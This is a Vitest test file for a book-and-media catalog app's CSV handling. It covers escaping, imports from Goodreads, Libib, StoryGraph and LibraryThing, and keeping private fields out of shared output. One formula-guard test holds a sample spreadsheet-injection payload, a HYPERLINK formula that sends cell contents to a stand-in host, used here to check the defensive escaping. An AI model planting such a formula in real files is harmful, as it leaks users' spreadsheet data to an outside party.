import { describe, expect, it } from 'vitest';
import type { Item } from '../src/db/schema';
import { csvEscape, csvLine, EXPORT_COLUMNS, looksLikeGoodreads, looksLikeNalandaExport, mapGoodreadsRow, mapLibibRow, mapLibraryThingRow, mapStoryGraphRow } from '../src/lib/csv';
import { toPublicItem } from '../src/lib/share';

describe('csv escaping', () => {
  it('quotes only when needed and doubles quotes', () => {
    expect(csvEscape('plain')).toBe('plain');
    expect(csvEscape('a,b')).toBe('"a,b"');
    expect(csvEscape('say "hi"')).toBe('"say ""hi"""');
    expect(csvEscape('line\nbreak')).toBe('"line\nbreak"');
    expect(csvEscape(null)).toBe('');
    expect(csvLine(['a', 'b,c'])).toBe('a,"b,c"\r\n');
  });

  it('guards a cell a spreadsheet would read as a formula with a leading quote, and a leading quote with another (§16 #91)', () => {
    const evil = '=HYPERLINK("https://evil.example/?d="&A1,"Click")';
    expect(csvEscape(evil)).toBe(`"'${evil.replaceAll('"', '""')}"`);
    expect(csvEscape('=1+1')).toBe("'=1+1");
    expect(csvEscape('+1 Forever')).toBe("'+1 Forever");
    expect(csvEscape('-')).toBe("'-");
    expect(csvEscape('@SUM(1+1)*cmd')).toBe("'@SUM(1+1)*cmd");
    expect(csvEscape('\tx')).toBe("'\tx"); // a tab needs no CSV quoting, only the guard
    expect(csvEscape("'quoted")).toBe("''quoted"); // so the import's one-quote strip gives it back
    expect(csvEscape(-1)).toBe('-1'); // a number is never a formula
    expect(csvEscape('2024-01-01')).toBe('2024-01-01');
    expect(csvEscape('plain = text')).toBe('plain = text');
  });
});

describe('libib row mapping', () => {
  const opts = { defaultType: 'book' as const, musicAsVinyl: true };

  it('maps the common libib columns', () => {
    const mapped = mapLibibRow(
      {
        'Title': 'The Dispossessed',
        'Creators': 'Ursula K. Le Guin',
        'EAN_ISBN13': '9780060512750',
        'Publisher': 'Harper',
        'Publish_Date': '1974',
        'Status': 'Completed',
        'Rating': '4.5',
        'Group': 'sci-fi shelf',
        'Tags': 'utopia, classics',
        'Length': '387',
        'Copies': '2',
      },
      opts,
    );
    expect(mapped).not.toBeNull();
    expect(mapped!.item.title).toBe('The Dispossessed');
    expect(mapped!.item.mediaType).toBe('book');
    expect(mapped!.item.isbn13).toBe('9780060512750');
    expect(mapped!.item.status).toBe('completed');
    expect(mapped!.item.rating).toBe(9); // 4.5 stars → 9 half-stars
    expect(mapped!.item.length).toBe(387);
    expect(mapped!.item.copies).toBe(2);
    expect(mapped!.tags).toEqual(['utopia', 'classics', 'sci-fi shelf']); // group becomes a tag
  });

  it('remaps music to vinyl when asked, keeps unknown columns in details', () => {
    const mapped = mapLibibRow(
      { title: 'Kind of Blue', item_type: 'music', ensemble: 'Miles Davis Sextet', status: 'not begun' },
      opts,
    );
    expect(mapped!.item.mediaType).toBe('vinyl');
    expect(mapped!.item.status).toBe('not_started');
    expect(JSON.parse(mapped!.item.details as string)).toEqual({ ensemble: 'Miles Davis Sextet' });

    const kept = mapLibibRow({ title: 'Kind of Blue', item_type: 'music' }, { ...opts, musicAsVinyl: false });
    expect(kept!.item.mediaType).toBe('music');
  });

  it('skips rows without a title and tolerates junk numbers', () => {
    expect(mapLibibRow({ creators: 'Nobody' }, opts)).toBeNull();
    const mapped = mapLibibRow({ title: 'X', rating: 'lots', length: '??', copies: '' }, opts);
    expect(mapped!.item.rating).toBeNull();
    expect(mapped!.item.length).toBeNull();
    expect(mapped!.item.copies).toBe(1);
  });

  it('keeps an explicit copies of 0 (cataloged, not owned)', () => {
    expect(mapLibibRow({ title: 'X', copies: '0' }, opts)!.item.copies).toBe(0);
  });
  it('splits a group on commas as it does tags, so the export and the next import agree on what the tags are', () => {
    const m = mapLibibRow({ title: 'X', group: 'sci-fi, classics', tags: 'utopia' }, opts)!;
    expect(m.tags).toEqual(['utopia', 'sci-fi', 'classics']);
    expect(mapLibibRow({ title: 'X', group: ' , ' }, opts)!.tags).toEqual([]);
  });
  it("dates an item from libib's `added` (§16 #90), a known column that never lands in details", () => {
    const dated = mapLibibRow({ title: 'X', added: '2021-05-03', esrb: 'E' }, opts)!;
    expect(dated.item.addedAt).toBe('2021-05-03 00:00:00');
    expect(JSON.parse(dated.item.details as string)).toEqual({ esrb: 'E' });
    const odd = mapLibibRow({ title: 'X', added: 'May 2021' }, opts)!;
    expect(odd.item).not.toHaveProperty('addedAt'); // not a date: the row is dated by its import, as before
    expect(JSON.parse(odd.item.details as string)).toEqual({});
  });
});

describe('goodreads row mapping', () => {
  // The column set a real Goodreads "Export Library" CSV produces.
  const row = {
    'Book Id': '18541',
    'Title': 'The Fifth Season (The Broken Earth, #1)',
    'Author': 'N.K. Jemisin',
    'Author l-f': 'Jemisin, N.K.',
    'Additional Authors': '',
    'ISBN': '="0316229296"',
    'ISBN13': '="9780316229296"',
    'My Rating': '5',
    'Average Rating': '4.32',
    'Publisher': 'Orbit',
    'Binding': 'Paperback',
    'Number of Pages': '512',
    'Year Published': '2015',
    'Original Publication Year': '2015',
    'Date Read': '2024/03/10',
    'Date Added': '2024/01/02',
    'Bookshelves': 'sci-fi, favorites',
    'Bookshelves with positions': 'sci-fi (#12), favorites (#3)',
    'Exclusive Shelf': 'read',
    'My Review': 'Stunning.<br/>Structurally daring.',
    'Spoiler': '',
    'Private Notes': 'lent my copy to Ana',
    'Read Count': '2',
    'Owned Copies': '0',
  };

  it('detects goodreads exports by the Exclusive Shelf column', () => {
    expect(looksLikeGoodreads(Object.keys(row))).toBe(true);
    expect(looksLikeGoodreads(['Title', 'Creators', 'EAN_ISBN13'])).toBe(false);
  });

  it('maps a full goodreads row', () => {
    const m = mapGoodreadsRow(row)!;
    expect(m.item.mediaType).toBe('book');
    expect(m.item.isbn13).toBe('9780316229296'); // ="…" guard stripped
    expect(m.item.isbn10Upc).toBe('0316229296');
    expect(m.item.rating).toBe(10); // 5 whole stars → 10 half-stars
    expect(m.item.status).toBe('completed'); // exclusive shelf "read"
    expect(m.item.completedOn).toBe('2024-03-10'); // slashes → ISO
    expect(m.item.review).toBe('Stunning.\nStructurally daring.'); // <br/> → newline
    expect(m.item.notes).toBe('lent my copy to Ana');
    expect(m.item.copies).toBe(0); // reading-log entry by default
    expect(m.item.length).toBe(512);
    expect(m.tags).toEqual(['sci-fi', 'favorites']); // exclusive shelf is not a tag
    expect(m.item.addedAt).toBe('2024-01-02 00:00:00'); // Date Added: when it joined the collection there (§16 #90)
    const details = JSON.parse(m.item.details as string);
    expect(details.goodreads_book_id).toBe('18541');
    expect(details).not.toHaveProperty('date_added'); // a real field now
    expect(details.average_rating).toBe('4.32');
    expect(details.binding).toBe('Paperback');
    expect(details).not.toHaveProperty('bookshelves_with_positions'); // duplicate, dropped
  });

  it('dates a book from Date Added only when it is a date', () => {
    expect(mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'to-read' })!.item).not.toHaveProperty('addedAt');
    const odd = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'to-read', 'Date Added': 'last spring' })!;
    expect(odd.item).not.toHaveProperty('addedAt');
    expect(JSON.parse(odd.item.details as string)).not.toHaveProperty('date_added'); // not a date: dropped, as nothing can read it
  });

  it('maps shelf states: to-read, currently-reading, dnf; unrated stays null', () => {
    const base = { 'Title': 'X', 'Exclusive Shelf': 'to-read', 'My Rating': '0', 'ISBN13': '=""' };
    const toRead = mapGoodreadsRow(base)!;
    expect(toRead.item.status).toBe('not_started');
    expect(toRead.item.rating).toBeNull();
    expect(toRead.item.isbn13).toBeNull(); // ="" → no ISBN
    expect(mapGoodreadsRow({ ...base, 'Exclusive Shelf': 'currently-reading' })!.item.status).toBe('in_progress');
    expect(mapGoodreadsRow({ ...base, 'Bookshelves': 'to-read, dnf' })!.item.status).toBe('abandoned');
    expect(mapGoodreadsRow({ ...base, 'Owned Copies': '1' })!.item.copies).toBe(1);
  });

  it('keeps custom exclusive shelves as tags (only the three built-ins are dropped)', () => {
    const m = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'to-re-read', 'Bookshelves': 'sci-fi' })!;
    expect(m.item.status).toBe('not_started'); // unknown exclusive shelf → not started
    expect(m.tags).toEqual(['sci-fi', 'to-re-read']); // shelf preserved, not lost
    const dnf = mapGoodreadsRow({ 'Title': 'Y', 'Exclusive Shelf': 'dnf', 'Bookshelves': '' })!;
    expect(dnf.item.status).toBe('abandoned');
    expect(dnf.tags).toEqual(['dnf']); // status set AND shelf kept as a tag
  });
});

describe('private columns never fall into details, whatever the file (§9)', () => {
  const opts = { defaultType: 'book' as const, musicAsVinyl: true };
  // columns someone might add to a reading site's export before importing it — the page says unknown columns are kept
  const secrets = {
    'Location': 'bedroom  safe',
    'Notes': 'spare key under the mat',
    'began_on': '2024-01-02',
    'completed_on': '2024-02-03',
    'loans': '2025-01-01..@Priya',
    'purchase_price': '12.50',
    'media_condition': 'VG+',
    'added_by': 'asha',
  };
  const published = (item: Record<string, unknown>) => JSON.stringify(toPublicItem({ id: 1, libraryId: 1, ...item } as unknown as Item));

  it('a Goodreads, StoryGraph or LibraryThing row maps location and notes onto their columns and keeps the rest out', () => {
    const gr = mapGoodreadsRow({ 'Title': 'X', 'Exclusive Shelf': 'read', 'Private Notes': 'from Goodreads', 'Binding': 'Paperback', ...secrets })!;
    expect(gr.item.location).toBe('bedroom safe');
    expect(gr.item.notes).toBe('from Goodreads\n\nspare key under the mat');
    expect(JSON.parse(gr.item.details as string)).toEqual({ binding: 'Paperback' });

    const sg = mapStoryGraphRow({ 'Title': 'X', 'Read Status': 'read', 'Dates Read': '', 'Moods': 'tense', 'Contributors': 'Someone', ...secrets })!;
    expect(sg.item.location).toBe('bedroom safe');
    expect(sg.item.notes).toBe('spare key under the mat\n\nStoryGraph — moods: tense');
    expect(JSON.parse(sg.item.details as string)).toEqual({ contributors: 'Someone' });

    const lt = mapLibraryThingRow({ 'Title': 'X', 'Primary Author': 'Y', 'Entry Date': '2020-01-01', 'Comment': 'signed', 'Subjects': 'Sf', ...secrets })!;
    expect(lt.item.location).toBe('bedroom safe'); // a location column first, Other Call Number otherwise
    expect(lt.item.notes).toBe('signed\n\nspare key under the mat');
    expect(JSON.parse(lt.item.details as string)).toEqual({ subjects: 'Sf' });

    for (const m of [gr, sg, lt]) {
      const out = published(m.item);
      for (const secret of ['bedroom', 'spare key', '2024-02-03', 'Priya', '12.50', 'VG+', 'asha']) expect(out, m.item.title).not.toContain(secret);
    }
  });

  it('a Nalanda export missing its details column reads as libib, its dates on the item and nothing private in details', () => {
    const headers = EXPORT_COLUMNS.filter((c) => c !== 'details'); // deleted in a spreadsheet; every other column intact
    expect(looksLikeNalandaExport(headers)).toBe(false);
    const row: Record<string, string> = Object.fromEntries(headers.map((h) => [h, '']));
    Object.assign(row, {
      title: 'Kindred',
      media_type: 'book',
      status: 'completed',
      began_on: '2024-01-02',
      completed_on: '2024-02-03',
      location: 'Study',
      notes: 'private',
      reads: 'completed:2024-01-02..2024-02-03@asha',
      loans: '2025-01-01..@Priya',
      added_by: 'asha',
      purchase_price: '12.50',
      purchase_currency: 'INR',
    });
    const m = mapLibibRow(row, opts)!;
    expect(m.item).toMatchObject({ beganOn: '2024-01-02', completedOn: '2024-02-03', location: 'Study', notes: 'private', purchasePrice: 1250, purchaseCurrency: 'INR' });
    expect(JSON.parse(m.item.details as string)).toEqual({});
    const out = published(m.item);
    for (const secret of ['2024-02-03', 'Study', 'private', 'Priya', 'asha', '12.50']) expect(out).not.toContain(secret);
  });
});
